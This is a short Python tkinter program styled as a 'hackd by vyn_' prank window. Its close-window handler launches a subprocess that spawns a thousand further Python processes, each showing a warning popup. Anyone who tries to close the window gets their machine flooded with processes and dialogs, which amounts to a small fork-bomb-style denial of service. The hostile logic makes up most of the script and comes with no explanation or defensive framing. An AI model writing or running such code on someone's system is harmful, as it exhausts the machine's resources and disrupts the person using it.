import tkinter as tk
import subprocess

def dont():
    ko = """from tkinter import messagebox
import subprocess
messagebox.showwarning('', 'no_')
ok='from tkinter import messagebox; messagebox.showwarning("", "no_")'
for i in range(1000):
    subprocess.Popen(['python3', '-c', ok])"""
    subprocess.Popen(['python3', '-c', ko])

root = tk.Tk()
root.protocol("WM_DELETE_WINDOW", dont)
root.resizable(False, False)
lab = tk.Label(root, text="hackd by vyn_", font=(
    "Courier", 25, "bold"))
lab.pack(pady=10, padx=10)
ent = tk.Entry(root)
ent.pack(pady=15, padx=100)
root.mainloop()